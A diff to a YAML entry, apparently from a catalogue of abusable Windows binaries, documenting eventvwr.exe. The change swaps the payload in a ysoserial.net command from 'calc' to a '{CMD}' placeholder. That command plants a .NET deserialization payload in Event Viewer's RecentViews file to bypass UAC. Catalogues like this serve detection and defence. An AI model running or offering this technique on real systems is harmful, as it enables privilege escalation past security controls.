@@ -1,7 +1,7 @@
 ---
 Name: Eventvwr.exe
 Description: Displays Windows Event Logs in a GUI window.
-Author: 'Jacob Gajek'
+Author: Jacob Gajek
 Created: 2018-11-01
 Commands:
   - Command: eventvwr.exe
@@ -14,7 +14,7 @@ Commands:
     Tags:
       - Application: GUI
       - Execute: EXE
-  - Command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c calc > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+  - Command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
     Description: During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net
     Usecase: Execute a command to bypass security restrictions that limit the use of command-line interpreters.
     Category: UAC Bypass
